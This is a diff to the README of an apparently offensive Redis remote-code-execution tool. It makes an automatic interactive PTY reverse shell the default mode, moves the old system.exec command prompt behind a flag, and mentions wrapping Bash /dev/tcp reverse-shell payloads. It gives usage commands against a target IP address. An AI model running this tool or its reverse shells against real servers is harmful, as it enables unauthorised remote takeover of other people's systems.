@@ -16,22 +16,24 @@ standalone CVE.
 
 ## Usage
 
-Interactive command execution:
+Automatic interactive PTY reverse shell:
 
 ```bash
 python3 redis-rce.py -r 192.168.168.93
 ```
 
-Automatic reverse shell using the proven replication callback port:
+The tool reuses the proven replication callback port, prefers a Python PTY,
+and falls back to Bash. Press `Ctrl-]` to disconnect; cleanup runs
+automatically after the shell closes. `--revshell` is retained as an explicit
+alias for the default behavior.
+
+Legacy stateless `system.exec` command prompt:
 
 ```bash
-python3 redis-rce.py -r 192.168.168.93 --revshell
+python3 redis-rce.py -r 192.168.168.93 --command-shell
 ```
 
-The reverse-shell mode prefers a Python PTY and falls back to Bash. Press
-`Ctrl-]` to disconnect; cleanup runs automatically after the shell closes.
-
-At the normal interactive prompt, direct Bash `/dev/tcp` payloads are
+At the legacy command prompt, direct Bash `/dev/tcp` payloads are
 automatically wrapped for compatibility with the module's `/bin/sh` runner:
 
 ```bash
